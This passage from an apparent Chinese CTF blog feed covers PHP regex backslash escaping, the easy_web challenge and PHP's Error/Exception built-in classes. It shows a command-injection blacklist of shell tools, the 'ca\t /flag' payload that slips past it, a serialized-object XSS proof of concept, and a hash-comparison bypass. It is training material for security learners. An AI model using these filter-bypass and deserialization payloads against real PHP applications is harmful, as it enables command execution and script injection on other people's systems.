class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>.PHP_EOL;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\\|\\\\/&quot;</span>,<span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;yes&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;no&quot;</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>这样写语法就没有问题了。这是哪里出错了？</p><p>我们先来做一个测试，我们知道在php中反斜杠 \  代表转义的意思，我们想要得到 \ 必须使用两个 斜杠 <code>\\</code> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;\\&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<br></code></pre></td></tr></table></figure><p>输出： <code>\</code></p><p>如果使用一个反斜杠 \ 去传参给cmd变量，正则匹配是匹配不到的：</p><img src="https://s2.loli.net/2022/12/26/Gwqf2FIPLDcsQgu.png" alt="image-20221226140752859" style="zoom:33%;" /><p>使用两个反斜杠 <code>\\</code> 也不行</p><img src="https://s2.loli.net/2022/12/26/vYUxgtbXepz13I4.png" alt="image-20221226140853110" style="zoom:33%;" /><p>？？？这不就是匹配反斜杠吗，为什么没用？</p><p>我们猜测，在php正则匹配中，可能进行了第二次转义。</p><p>首先是由于php解释器第一次转义， <code>/\\|\\\\/</code>  第一次转义变成了 <code>/\|\\</code> </p><p>然后php正则匹配函数进行了第二次转义。 <code>/\|\\</code> 被转义成了 <code>/|\/</code>  </p><p>其中的或 | 分隔符 被转义成为了普通的一个字符 |  反斜杠也变成了普通的 \ </p><p>于是我们进行测试：</p><p>我们cmd传入一个 <code>|\\</code> 由于php解释器进行了一次转义，所以实际参入正则的就是 <code>|\</code> </p><img src="https://s2.loli.net/2022/12/26/R4BYQwonTWKm7rD.png" alt="image-20221226141518787" style="zoom:33%;" /><p>发现输出了yes，所以我们的猜测是正确的。</p><p>如果我们在正则表达式中只写两个反斜杠 <code>\\</code>  编译器会报错的：</p><img src="https://s2.loli.net/2022/12/26/IwBn3KHvS9sRzUF.png" alt="image-20221226141748840" style="zoom:33%;" /><p>原因应该就是，php解释器先转义了一个成为 \  然后第二次转义， 反斜杠 \ 又会对后面的进行转义，导致报错</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>php正则匹配中要想匹配 反斜杠 \ 必须使用四个反斜杠 <code>\\\\</code>  ，不能只使用两个反斜杠 <code>\\</code></p><h3 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h3><p>这一题就和上面情况类似，部分代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>简化如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/cat|\\|\\\\|/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里，我们可以使用 <code>$cmd=&quot;ca\t /flag&quot;</code> 得到flag，为什么可以使用反斜杠？原因就是上面所说，</p><p>这里 <code>/\\|\\\\/</code> 只匹配的是 <code>|\</code>  并没有匹配到反斜杠。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php正则匹配反斜杠问题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php正则匹配(i,m,s,x,e)</title>
    <link href="/2023/08/24/php%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D(i,m,s,x,e)/"/>
    <url>/2023/08/24/php%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D(i,m,s,x,e)/</url>
    
    <content type="html"><![CDATA[<h2 id="php正则中-i-m-s-x-e-分别代表什么"><a href="#php正则中-i-m-s-x-e-分别代表什么" class="headerlink" title="php正则中 &#x2F;i,m,s,x,e 分别代表什么"></a>php正则中 &#x2F;i,m,s,x,e 分别代表什么</h2><h3 id="i"><a href="#i" class="headerlink" title="i"></a>i</h3><p><code>i </code>代表忽略大小写</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;china&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/China/&quot;</span>,<span class="hljs-variable">$a</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/China/i&quot;</span>,<span class="hljs-variable">$a</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-comment">//输出：2</span><br></code></pre></td></tr></table></figure><h3 id="m"><a href="#m" class="headerlink" title="m"></a>m</h3><p>多行匹配，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;def\nabc&quot;</span>;  <span class="hljs-comment">//注意使用双引号，否则 \n 不是换行</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/^abc$/m&quot;</span>,<span class="hljs-variable">$a</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nb&#x27;</span>;<br>&#125;<br><span class="hljs-comment">// 输出：nb</span><br></code></pre></td></tr></table></figure><p>此处正则会匹配多行，而第二行的始末为abc，所以输出：nb</p><h3 id="s"><a href="#s" class="headerlink" title="s"></a>s</h3><p>如果设置了 <code>/s</code>  那么正则中的圆点符：<code>.</code> 会匹配所有字符，包括换行符。<strong>如果没有设置，则不包括换行符</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/./s&quot;</span>,<span class="hljs-variable">$a</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/./&quot;</span>,<span class="hljs-variable">$a</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-number">2</span>;<br>&#125;<br><span class="hljs-comment">//输出：1</span><br></code></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/reference.pcre.pattern.modifiers.php">php正则修饰符</a></p><p><a href="https://www.php.cn/php-weizijiaocheng-354831.html">php正则 &#x2F;i,m,s</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php正则匹配(i,m,s,x,e)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP弱类型安全问题</title>
    <link href="/2023/08/24/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
    <url>/2023/08/24/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p><a href="https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&mid=2247494684&idx=1&sn=8264be9d89d29cc3c2c493b9aaa8d35f&chksm=fa5239a2cd25b0b4b7073702768b7327b1136588b67fe0fa751cb2e781738d0096353743b47c&mpshare=1&scene=23&srcid=1122HDUNxkdXOEUG53sjruHa&sharer_sharetime=1669129772618&sharer_shareid=aec85d9f6a58e1f0ea691a33fe869fa1#rd">https://mp.weixin.qq.com/s?__biz=MzUzMDUxNTE1Mw==&amp;mid=2247494684&amp;idx=1&amp;sn=8264be9d89d29cc3c2c493b9aaa8d35f&amp;chksm=fa5239a2cd25b0b4b7073702768b7327b1136588b67fe0fa751cb2e781738d0096353743b47c&amp;mpshare=1&amp;scene=23&amp;srcid=1122HDUNxkdXOEUG53sjruHa&amp;sharer_sharetime=1669129772618&amp;sharer_shareid=aec85d9f6a58e1f0ea691a33fe869fa1#rd</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP弱类型安全问题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php内置类小结</title>
    <link href="/2023/08/24/php%E5%86%85%E7%BD%AE%E7%B1%BB%E5%B0%8F%E7%BB%93/"/>
    <url>/2023/08/24/php%E5%86%85%E7%BD%AE%E7%B1%BB%E5%B0%8F%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="php内置类小结"><a href="#php内置类小结" class="headerlink" title="php内置类小结"></a>php内置类小结</h2><h3 id="Error、Exception进行xss、绕过hash比较"><a href="#Error、Exception进行xss、绕过hash比较" class="headerlink" title="Error、Exception进行xss、绕过hash比较"></a>Error、Exception进行xss、绕过hash比较</h3><h4 id="Error类"><a href="#Error类" class="headerlink" title="Error类"></a>Error类</h4><p><strong>Error(PHP 7, PHP 8)</strong>  是所有PHP内部错误类的基类。</p><ul><li>使用与php7以后的版本</li><li>需要有报错的情况</li></ul><p>Error类是php的一个内置类，通常用于自定义一个Error，在php7版本后适用，可能存在xss漏洞，因为内置了一个 <code>__toString()</code> 方法。常用于php反序列化中，如果有个pop链走不通了，可能需要使用这个类做一个xss，当php对象被当作一个字符串输出或使用的时候（如：<code>echo</code> ）会触发 <code>__toString()</code> 方法</p><p>下面我们来测试一下如何使用Error类构造xss</p><p>测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;whoami&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);  <br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span><br></code></pre></td></tr></table></figure><p>测试一下：</p><p><img src="https://s2.loli.net/2023/05/30/9MbqdKyjVUJfaiI.png" alt="image-20230530181322872"></p><p>成功触发xss漏洞</p><h4 id="Exception类"><a href="#Exception类" class="headerlink" title="Exception类"></a>Exception类</h4><ul><li>php5、7版本以后</li><li>开启报错</li></ul><p>触发xss和上面一样，此处不再赘述</p><h4 id="使用Error、Exception内置类绕过md5、sha1等哈希比较"><a href="#使用Error、Exception内置类绕过md5、sha1等哈希比较" class="headerlink" title="使用Error、Exception内置类绕过md5、sha1等哈希比较"></a>使用Error、Exception内置类绕过md5、sha1等哈希比较</h4><p>我们详细介绍一下Error、Exception类</p><h5 id="Error类详解"><a href="#Error类详解" class="headerlink" title="Error类详解"></a>Error类详解</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Error</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Throwable</span> </span>&#123;<br>    <span class="hljs-comment">/* 属性 */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$string</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">array</span> <span class="hljs-variable">$trace</span> = [];<br>    <span class="hljs-keyword">private</span> ?<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span>;<br>    <span class="hljs-comment">/* 方法 */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span>, ?<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span>)<br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMessage</span>(): <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPrevious</span>(): ?<span class="hljs-built_in">Throwable</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCode</span>(): <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFile</span>(): <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getLine</span>(): <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTrace</span>(): <span class="hljs-keyword">array</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTraceAsString</span>(): <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span>(): <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_ invoke__">__clone</span>(): <span class="hljs-keyword">void</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>类属性：</strong></p><ul><li>message：错误消息内容</li><li>code：错误代码</li><li>file：抛出错误的文件名</li><li>line：抛出错误在该文件中的行数</li></ul><p><strong>类方法：</strong></p><ul><li><a href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> — 初始化 error 对象</li><li><a href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> — 获取错误信息</li><li><a href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> — 返回先前的 Throwable</li><li><a href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> — 获取错误代码</li><li><a href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> — 获取错误发生时的文件</li><li><a href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> — 获取错误发生时的行号</li><li><a href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> — 获取调用栈（stack trace）</li><li><a href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> — 获取字符串形式的调用栈（stack trace）</li><li><a href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> — error 的字符串表达</li><li><a href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> — 克隆 error</li></ul><h5 id="Exception类详解"><a href="#Exception类详解" class="headerlink" title="Exception类详解"></a>Exception类详解</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exception</span> </span>&#123;<br>    <span class="hljs-comment">/* 属性 */</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">string</span> <span class="hljs-variable">$file</span> ;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$line</span> ;<br>    <span class="hljs-comment">/* 方法 */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__construct</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$message</span> = <span class="hljs-string">&quot;&quot;</span> , <span class="hljs-keyword">int</span> <span class="hljs-variable">$code</span> = <span class="hljs-number">0</span> , <span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$previous</span> = <span class="hljs-literal">null</span> )<br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getMessage</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getPrevious</span> ( ) : <span class="hljs-built_in">Throwable</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getCode</span> ( ) : <span class="hljs-keyword">mixed</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getFile</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getLine</span> ( ) : <span class="hljs-keyword">int</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTrace</span> ( ) : <span class="hljs-keyword">array</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">getTraceAsString</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_ invoke__">__toString</span> ( ) : <span class="hljs-keyword">string</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">private</span> <span class="hljs-title function_ invoke__">__clone</span> ( ) : <span class="hljs-keyword">void</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>类属性：</strong></p><ul><li>message：异常消息内容</li><li>code：异常代码</li><li>file：抛出异常的文件名</li><li>line：抛出异常在该文件中的行号</li></ul><p><strong>类方法：</strong></p><ul><li><a href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> — 异常构造函数</li><li><a href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> — 获取异常消息内容</li><li><a href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> — 返回异常链中的前一个异常</li><li><a href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> — 获取异常代码</li><li><a href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> — 创建异常时的程序文件名称</li><li><a href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> — 获取创建的异常所在文件中的行号</li><li><a href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> — 获取异常追踪信息</li><li><a href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> — 获取字符串类型的异常追踪信息</li><li><a href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> — 将异常对象转换为字符串</li><li><a href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> — 异常克隆</li></ul><p>我们可以清楚的看到，两个类都带有 <code>__toString()</code> 方法，将异常对象转化为字符串</p><p>我们以<code>Exception</code>为例，查看一下异常对象的字符串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$e</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$e</span>;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/30/beRrBcxV2LhuAZq.png" alt="image-20230530182217064"></p><p>发现这会以字符串的方式输出报错，并且包含当前的错误信息：<code>payload</code> 和 当前报错的行号 <code>3</code> ，但是传入的错误代码<code>2</code> 没有显示出来</p><p>我们看一下另一个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;payload&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\r\n\r\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-built_in">Exception</span>: payload in D:\Applications\CTF\phpstudy_pro\WWW\demo.php:<span class="hljs-number">2</span><br>Stack trace:<br><span class="hljs-comment">#0 &#123;main&#125;</span><br><br><span class="hljs-built_in">Exception</span>: payload in D:\Applications\CTF\phpstudy_pro\WWW\demo.php:<span class="hljs-number">2</span><br>Stack trace:<br><span class="hljs-comment">#0 &#123;main&#125;</span><br></code></pre></td></tr></table></figure><p>我们发现：这两个异常对象是不同的（异常代码不同）但<code>__toString()</code>方法的输出的结果一模一样，</p><p>因为此时我们控制了 <code>payload</code> 和 行号<code>2</code>一致（这里写在一行就是为了保证行号一致）</p><p>我们可以利用这个特性去绕过**md5()<strong>、</strong>sha1()**等哈希比较  。 Error用法一致（注意php版本）</p><h5 id="例题：-2020-极客大挑战-Greatphp"><a href="#例题：-2020-极客大挑战-Greatphp" class="headerlink" title="例题：[2020 极客大挑战]Greatphp"></a>例题：[2020 极客大挑战]Greatphp</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 